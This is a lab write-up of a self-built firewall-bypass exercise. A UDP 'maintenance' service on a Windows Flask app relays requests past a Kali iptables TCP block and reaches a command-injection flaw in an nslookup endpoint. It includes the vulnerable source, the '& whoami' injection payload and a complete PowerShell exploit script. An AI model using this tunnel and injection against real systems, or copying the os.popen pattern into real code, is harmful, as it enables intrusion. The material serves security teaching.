👻 **GhostPort — Beyond the Firewall — UDP-to-TCP Firewall Bypass & Command Injection**

This project demonstrates how an exposed UDP maintenance service can bypass TCP firewall restrictions and lead to command execution.

**• Windows VM · Kali Linux · VMware · Python Flask · iptables**

<img width="1024" height="1536" alt="image" src="https://github.com/user-attachments/assets/6d550e13-9132-412a-b4d1-e0111f5cedff" />


# 1. Goal of the project

Demonstrating that blocking TCP traffic does not necessarily make a Windows web server secure. The key lesson is that an allowed UDP service can provide an indirect route to a blocked TCP application.


# 2. Project steps

## 2.1. Overview

- Run a vulnerable Flask web application on Windows.

- Place Kali Linux between host and Windows as a firewall.

- Use `iptables` to block TCP and allow UDP.

- Discover an undocumented maintenance service.

- Exploit the service to execute `whoami` on Windows despite the TCP firewall.

## 2.2. Our network setup

<img width="1092" height="1440" alt="image" src="https://github.com/user-attachments/assets/b427835b-eada-47fe-bbd4-be47966e78eb" />


## 2.3. Run the Windows web server

On Windows VM — PowerShell as Administrator

We open the folder containing the provided `server.py`, then execute:

```powershell
py -m pip install flask
py server.py
```

`pip install` will reuse Flask if it is already installed. `py server.py` starts the application.

Then, we allow the application through Windows Firewall in another Administrator PowerShell terminal:

```powershell
New-NetFirewallRule -DisplayName "P12 Web" -Direction Inbound -Protocol TCP -LocalPort 7777 -Action Allow -Profile Any
```

Before changing the Windows network, we access it from our host browser:

```
http://10.10.10.131:7777
```

The following confirms that the web application is successfully accessible from the host, with the browser URL visible.


<img width="840" height="776" alt="image" src="https://github.com/user-attachments/assets/0318cf66-f79c-4013-b563-8f21cee69b56" />




### 2.4.2. Assign Windows VM IP

Windows VM— Administrator PowerShell

After moving the Windows VM adapter to VMnet2:

```powershell
netsh interface ipv4 set address name="Ethernet0" static 192.168.77.10 255.255.255.0 192.168.77.1
```

Explanation:

- `Ethernet0`: Windows VM network interface

- `192.168.77.10`: New Windows VM IP

- `255.255.255.0`: Subnet mask

- `192.168.77.1`: Kali gateway


<img width="465" height="647" alt="image" src="https://github.com/user-attachments/assets/f2ea181d-dd50-4761-bc80-387498d63678" />




### 2.4.3. Configure Kali's interfaces

We identify our two interfaces. We use `eth0` for NAT and `eth1` for the internal network. 

```bash
ip -br addr
```

<img width="952" height="192" alt="image" src="https://github.com/user-attachments/assets/f6368ff5-af5c-4470-bfed-760547955efe" />

```bash
EXT=eth0
INT=eth1
WIN=192.168.77.10

KALI_IP=$(ip -4 -o addr show dev "$EXT" | awk '{print $4}' | cut -d/ -f1)

sudo ip link set "$INT" up
sudo ip addr add 192.168.77.1/24 dev "$INT"
sudo sysctl -w net.ipv4.ip_forward=1
```

- `ip addr add`: Assigns an IP to Kali's internal network interface.

- `/24`: Subnet mask equivalent to `255.255.255.0`.

- `ip_forward=1`: Allows Kali to forward packets between interfaces.

- `KALI_IP`: Automatically stores Kali's external IPv4 address.

On Windows VM in PowerShell as Administrator allow ping requests from Kali:

```powershell
New-NetFirewallRule -DisplayName "P12 Allow Ping" -Protocol ICMPv4 -IcmpType 8 -Direction Inbound -RemoteAddress 192.168.77.1 -Action Allow -Profile Any
```

This allows Kali (`192.168.77.1`) to ping Windows without disabling Windows Firewall.

Test Windows VM from Kali:

```bash
ping -c 4 192.168.77.10
```

- `-c 4`: Send 4 packets.

- `192.168.77.10`: Windows VM's internal IP address.


<img width="902" height="305" alt="image" src="https://github.com/user-attachments/assets/609fc94e-939a-40e6-888d-176498451ee8" />




Kali is successfully pinging Windows.

### 2.4.4. Forward traffic using iptables

We first configure Destination Network Address Translation (DNAT). These commands modify the Kali firewall. The reset affects its forwarding and DNAT rules.

```bash
sudo iptables -F FORWARD
sudo iptables -t nat -F PREROUTING
sudo iptables -P FORWARD ACCEPT
```

Now forward incoming TCP port 7777 to Windows:

```bash
sudo iptables -t nat -A PREROUTING -i "$EXT" -d "$KALI_IP" -p tcp --dport 7777 -j DNAT --to-destination "$WIN"
```

Forward incoming UDP on every port:

```bash
sudo iptables -t nat -A PREROUTING -i "$EXT" -d "$KALI_IP" -p udp -j DNAT --to-destination "$WIN"
```

Important syntax:

| Part                      | Meaning                                |
| ------------------------- | -------------------------------------- |
| `-t nat`                  | Use the NAT table                      |
| `-A PREROUTING`           | Add rule before routing                |
| `-i "$EXT"`               | Packets arriving on external interface |
| `-d "$KALI_IP"`           | Packets addressed to Kali              |
| `-p tcp` / `-p udp`       | Match protocol                         |
| `--dport 7777`            | Destination port 7777                  |
| `-j DNAT`                 | Change destination IP                  |
| `--to-destination "$WIN"` | Forward to Windows                     |

Now test from the host browser:

```
http://10.10.10.129:7777
```

The web application should still open, but now traffic passes through Kali.


<img width="902" height="646" alt="image" src="https://github.com/user-attachments/assets/e7b485a3-8c5c-4407-861e-b14d01990fe6" />




Application accessible through Kali's IP.

## 2.5. Block TCP, allow UDP

On Kali Run:

```bash
sudo iptables -F FORWARD
sudo iptables -P FORWARD DROP
```

Now allow external UDP traffic going to Windows:

```bash
sudo iptables -A FORWARD -i "$EXT" -o "$INT" -d "$WIN" -p udp -j ACCEPT
```

Allow UDP replies from Windows:

```bash
sudo iptables -A FORWARD -i "$INT" -o "$EXT" -s "$WIN" -p udp -j ACCEPT
```

Explicitly block incoming TCP to Windows:

```bash
sudo iptables -A FORWARD -i "$EXT" -o "$INT" -d "$WIN" -p tcp -j DROP
```

Show firewall:

```bash
sudo iptables -L FORWARD -n -v --line-numbers
```


<img width="882" height="297" alt="image" src="https://github.com/user-attachments/assets/8a784976-3bf4-4fce-8fc2-7e15fc4fee67" />




Policy:

| Traffic                 | Action          |
| ----------------------- | --------------- |
| Host → Windows VM TCP   | DROP            |
| Host → Windows VM UDP   | ACCEPT          |
| Windows VM → Host UDP   | ACCEPT          |
| Other forwarded traffic | DROP by default |

> [!note] Note: 
> These rules apply to traffic forwarded through Kali. They do not block all traffic addressed to Kali itself.

**Test the TCP block**

From host browser, refresh:

```
http://10.10.10.129:7777
```


<img width="950" height="790" alt="image" src="https://github.com/user-attachments/assets/97ed20f7-0ca0-474f-9043-a235868c1807" />




**Test UDP forwarding**

First, on Kali we open another terminal:

```bash
INT=eth1
sudo tcpdump -ni "$INT" 'udp and host 192.168.77.10'
```

- `-n`: Do not resolve addresses to names.

- `-i`: Capture on the internal interface.

- `udp`: Capture only UDP packets.

On Windows host, we use PowerShell to send a UDP test packet:

```powershell
$u = [Net.Sockets.UdpClient]::new()
$b = [Text.Encoding]::UTF8.GetBytes("UDP-TEST")
[void]$u.Send($b,$b.Length,"10.10.10.129",8888)
$u.Close()
```

This uses Windows' built-in .NET UDP client, so there is no need to install Netcat on the host. 

<img width="942" height="392" alt="image" src="https://github.com/user-attachments/assets/29bae27b-ee64-41d9-b51b-fe2cc0887865" />



tcpdump` shows UDP traffic forwarded to `192.168.77.10:8888`. This verifies forwarding; the Windows application must also be listening and Windows Firewall must permit the packet for application-level delivery.

## 2.6. Find the vulnerability and bypass the firewall

### 2.6.1 Examine the vulnerable code

Windows VM — PowerShell

In `server.py` directory, we execute:

```powershell
Select-String -Path .\server.py -Pattern 'MaintenanceService|MAINTENANCE_PORT|SOCK_DGRAM|base64|os.popen|diagnostic' -Context 2,4
```

| Code                      | Meaning                              |
| ------------------------- | ------------------------------------ |
| `SOCK_DGRAM`              | UDP socket                           |
| `MAINTENANCE_PORT = 8888` | Hidden UDP service                   |
| `base64.b64decode()`      | Decodes incoming instructions        |
| `socket.SOCK_STREAM`      | Opens a TCP connection               |
| `os.popen(command)`       | Executes an operating-system command |
| It results in:            |                                      |

```
  server.py:1:import socket
> server.py:2:import base64
  server.py:3:import os
  server.py:4:import time
  server.py:5:from flask import Flask, request,
render_template_string
  server.py:6:
  server.py:8:    BIND_IP = '0.0.0.0'
  server.py:9:    PORT = 7777
> server.py:10:    MAINTENANCE_PORT = 8888
  server.py:11:    BLACKLISTED_DOMAINS =
{"internal.corp", "confidential.local"}
  server.py:12:
  server.py:13:class LegacySystemUtils:
  server.py:14:    def __init__(self, config):
  server.py:24:        }
  server.py:25:
> server.py:26:    def execute_diagnostic(self, target):
> server.py:27:        print(f"Executing diagnostic for
target: {target}")
  server.py:28:        if any(domain in target for
domain in self.config["BLACKLISTED_DOMAINS"]):
  server.py:29:            return "Error: Target domain
is blacklisted for security reasons."
  server.py:30:        base_command = "nslookup"
  server.py:31:        command = f"{base_command}
{target}"
  server.py:32:        try:
> server.py:33:            result_stream =
os.popen(command)
  server.py:34:            output = result_stream.read()
  server.py:35:        except Exception as e:
  server.py:36:            output = f"A system error
occurred during execution: {e}"
  server.py:37:        return output
  server.py:59:    <div class="container">
  server.py:60:      <h1>Legacy Corp Intranet</h1>
> server.py:61:      <nav><a href="/">Diagnostics</a> |
<a href="/status">System Status</a></nav>
  server.py:62:      {{ content|safe }}
  server.py:63:    </div>
  server.py:64:  </body>
  server.py:65:</html>
  server.py:67:
  server.py:68:DIAG_CONTENT = """
> server.py:69:<h2>Network Diagnostic Tool</h2>
  server.py:70:<p>Enter a hostname to perform a DNS
lookup.</p>
  server.py:71:<form method="post">
  server.py:72:  <input type="text" name="target_host"
placeholder="e.g., example.com" value="{{ user_input
}}">
  server.py:73:  <input type="submit" value="Run
Lookup">
  server.py:88:"""
  server.py:89:
> server.py:90:class MaintenanceService:
  server.py:91:    def __init__(self, host='0.0.0.0'):
  server.py:92:        self.host = host
> server.py:93:        self.maintenance_socket =
socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
> server.py:94:
self.maintenance_socket.bind((host,
Config.MAINTENANCE_PORT))
> server.py:95:        print(f"Maintenance service
listening on {host}:{Config.MAINTENANCE_PORT}")
  server.py:96:
  server.py:97:    def run(self):
> server.py:98:        print(f"MaintenanceService
starting on {self.host}")
  server.py:99:
  server.py:100:        while True:
  server.py:101:            try:
  server.py:102:                data, addr =
self.maintenance_socket.recvfrom(4096)
  server.py:107:                    print(f"Maintenance
request from {source_ip}, payload: {payload_str}")
  server.py:108:
> server.py:109:                    decoded =
base64.b64decode(payload_str).decode('utf-8')
  server.py:110:                    print(f"Decoded
request: {decoded}")
  server.py:111:
  server.py:112:                    if ':' in decoded:
  server.py:113:                        parts =
decoded.split(':', 2)
  server.py:133:
print(f"Response: {response_text}")
  server.py:134:
> server.py:135:
reply_data = base64.b64encode(f"OK:{response_text}".enco
de()).decode()
  server.py:136:
print(f"Sending maintenance response: {reply_data}")
  server.py:137:
  server.py:138:
self.maintenance_socket.sendto(reply_data.encode(),
addr)
  server.py:139:
print(f"Maintenance response sent to {source_ip}")
  server.py:162:
  server.py:163:@app.route('/', methods=['GET', 'POST'])
> server.py:164:def diagnostic_tool():
  server.py:165:    output = ""
  server.py:166:    user_input = ""
  server.py:167:    utils =
LegacySystemUtils(app.config)
  server.py:168:    if request.method == 'POST':
  server.py:170:        user_input = target_host
  server.py:171:        if target_host:
> server.py:172:            output =
utils.execute_diagnostic(target_host)
  server.py:173:    inner =
render_template_string(DIAG_CONTENT, output=output,
user_input=user_input)
  server.py:174:    return
render_template_string(BASE_TEMPLATE, content=inner)
  server.py:175:
> server.py:176:@app.route('/diagnostic',
methods=['POST'])
> server.py:177:def diagnostic_post():
  server.py:178:    utils =
LegacySystemUtils(app.config)
  server.py:179:    target_host =
request.form.get('target_host', '')
  server.py:180:    if target_host:
> server.py:181:        output =
utils.execute_diagnostic(target_host)
  server.py:182:        return output
  server.py:183:    return "No target specified"
  server.py:184:
  server.py:185:@app.route('/status')
  server.py:193:    import threading
  server.py:194:
> server.py:195:    maintenance_service =
MaintenanceService()
  server.py:196:    maintenance_thread =
threading.Thread(target=maintenance_service.run,
daemon=True)
  server.py:197:    maintenance_thread.start()
  server.py:198:
  server.py:199:    app.run(host=app.config['BIND_IP'],
port=app.config['PORT'], debug=False,
use_reloader=False)
```

It confirms two security weaknesses in `server.py` that could make the firewall bypass possible.

#### Command injection vulnerability — Line 33

```python
base_command = "nslookup"
command = f"{base_command} {target}"
result_stream = os.popen(command)
```

Why is this vulnerable? Normally, the application executes:

```powershell
nslookup google.com
```

But an attacker-controlled input such as:

```
127.0.0.1 & whoami
```

can produce:

```
nslookup 127.0.0.1 & whoami
```

On Windows, `&` separates commands. Therefore, `whoami` also executes.

#### Hidden UDP MaintenanceService — Lines 90–109

```python
MAINTENANCE_PORT = 8888
```

```python
socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
```

```python
decoded = base64.b64decode(payload_str).decode('utf-8')
```

This tells us:

- The maintenance service listens on UDP port `8888`.

- It receives Base64-encoded messages.

- It decodes incoming requests.

- It may allow access to the blocked web application, depending on the forwarding logic.

The vulnerability: Kali blocks incoming TCP, but permits UDP. An unprotected UDP maintenance service may allow requests to reach the vulnerable Flask application indirectly.

### 2.6.2 Allow the maintenance service UDP access on Windows

On Windows VM:

```powershell
New-NetFirewallRule -DisplayName "P12 Maintenance UDP" -Direction Inbound -Protocol UDP -LocalPort 8888 -Action Allow -Profile Any
```

This permits UDP packets to reach the maintenance service without disabling Windows Firewall.

> [!tip] Remark: 
> In our Agent 007 project we used restrictive Windows outbound firewall rules.

```powershell
New-NetFirewallRule -DisplayName "P12 UDP Replies" -Direction Outbound -Protocol UDP -LocalPort 8888 -Action Allow -Profile Any
```

### 2.6.3 Exploit the UDP-to-TCP tunnel

We run the following in PowerShell on our host machine.

It sends a UDP request that makes Windows connect to its own TCP web server and execute `whoami` through the vulnerable diagnostic endpoint.

```powershell
$kali = "10.10.10.129"

$body = "target_host=127.0.0.1%26whoami%3EC%3A%5CUsers%5CPublic%5Cp12-proof.txt"

$http = "POST /diagnostic HTTP/1.1`r`nHost: 127.0.0.1`r`nContent-Type: application/x-www-form-urlencoded`r`nContent-Length: $($body.Length)`r`nConnection: close`r`n`r`n$body"

$forward = "127.0.0.1:7777:$http"

$payload = [Convert]::ToBase64String(
    [Text.Encoding]::UTF8.GetBytes($forward)
)

$udp = [Net.Sockets.UdpClient]::new()
$udp.Client.ReceiveTimeout = 5000

$bytes = [Text.Encoding]::UTF8.GetBytes($payload)

[void]$udp.Send($bytes,$bytes.Length,$kali,8888)

$remote = [Net.IPEndPoint]::new([Net.IPAddress]::Any,0)

try {
    $response = $udp.Receive([ref]$remote)

    [Text.Encoding]::UTF8.GetString(
        [Convert]::FromBase64String(
            [Text.Encoding]::UTF8.GetString($response)
        )
    )
}
catch {
    Write-Warning $_.Exception.Message
}
finally {
    $udp.Close()
}
```

How the exploit works:


<img width="1083" height="1452" alt="image" src="https://github.com/user-attachments/assets/b9580f0b-80fb-44da-b749-5e974256125a" />




<img width="427" height="292" alt="image" src="https://github.com/user-attachments/assets/82a544be-3f2f-4d0c-b43f-23f76f0d4b62" />



The Base64 response contains the HTTP headers. This means:

- UDP request received a response through the maintenance service.

- The Flask application returned HTTP `200 OK`.

- The UDP-to-TCP bypass is working at the HTTP communication level.

**In simple words:** 

Firewall is bypassed and the UDP request reached the MaintenanceService, which forwarded it to Flask and received `HTTP/1.1 200 OK`.

On Windows VM:


<img width="471" height="107" alt="image" src="https://github.com/user-attachments/assets/0b650441-bb93-4d3c-b8af-5c13402a3dc2" />


The UDP request bypassed the TCP firewall through the MaintenanceService. The application decoded `%26` into `&`, allowing command injection through the vulnerable `os.popen()` function. The injected `whoami` command executed on the Windows VM, and its output was saved to `C:\Users\Public\p12-proof.txt`.

**Command execution:** 

The Windows VM displays the contents of `p12-proof.txt`, including `shnsrn-dc\sheko`.

# 3. Conclusion

In this project, we learned that blocking TCP traffic with a firewall is not enough to keep a web application secure.

Although Kali successfully blocked TCP connections, the hidden UDP MaintenanceService allowed us to reach the web application through another path. We used this weakness to run the `whoami` command on the Windows VM.

This shows why we need to secure both the network and the application. Unnecessary services should be disabled, only required ports should be allowed, and user input should be checked to prevent command injection.
